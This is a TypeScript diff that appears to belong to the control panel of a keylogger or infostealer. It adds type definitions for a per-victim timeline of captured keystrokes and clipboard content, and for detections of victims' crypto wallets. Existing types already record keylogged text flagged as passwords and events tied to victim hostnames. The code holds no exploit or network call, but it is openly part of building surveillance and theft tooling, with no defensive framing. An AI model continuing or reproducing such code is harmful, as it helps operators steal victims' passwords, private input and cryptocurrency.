@@ -155,6 +155,34 @@ export type ClipboardEntry = {
 
 export type Keylog = { id: string; ts: string; process: string; title: string; text: string; password: boolean; count?: number };
 
+export type TimelineEntry = {
+  id: string;
+  victimId: string;
+  ts: string;
+  origin: 'keystroke' | 'clipboard';
+  process: string;
+  title: string;
+  content: string;
+  kind: string;
+  patterns: string[];
+  count: number;
+};
+
+export type WalletDetection = {
+  id: string;
+  victimId: string;
+  provider: string;
+  kind: string;
+  process: string;
+  window: string;
+  url: string | null;
+  pid: number | null;
+  firstSeenAt: string;
+  lastSeenAt: string;
+  closedAt: string | null;
+  count: number;
+};
+
 export type EventRow = { id: string; kind: string; data: Record<string, unknown>; legacy: string; createdAt: string; victim?: { id: string; hostname: string }; readAt: string | null };
 
 export type Notification = { id: string; kind: string; title: string; body: string; link: string | null; readAt: string | null; createdAt: string };
